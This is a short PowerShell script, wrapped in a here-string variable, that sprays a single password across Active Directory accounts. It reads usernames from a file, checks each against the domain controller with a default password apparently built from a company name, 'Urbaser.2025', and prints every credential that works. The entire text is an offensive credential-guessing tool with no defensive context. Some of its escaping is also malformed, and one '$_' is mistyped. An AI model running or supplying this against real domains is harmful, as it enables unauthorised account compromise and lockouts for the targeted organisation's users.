$Spray = @"
param(
    [string]$Domain = \$env:USERDNSDOMAIN,
    [string]$Dc     = \$env:LOGONSERVER.TrimStart("\\"),
    [string]$UserListPath = ".\users.txt",
    [string]$Password     = "Urbaser.2025"
)

if (-not (Test-Path \$UserListPath)) {
    Write-Host "[!] No se encuentra el fichero de usuarios: \$UserListPath"
    exit 1
}

\$users = Get-Content -Path \$UserListPath | Where-Object { \$_ -and \$.Trim() -ne "" }

Add-Type -AssemblyName System.DirectoryServices.AccountManagement

\$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
    [System.DirectoryServices.AccountManagement.ContextType]::Domain,
    \$Dc
)

foreach (\$u in \$users) {
    \$sam = \$u.Trim()
    try {
        \$ok = \$ctx.ValidateCredentials(\$sam, \$Password)
        if (\$ok) {
            Write-Output "\$sam : \$Password"
        }
    } catch {
        continue
    }
}
"@
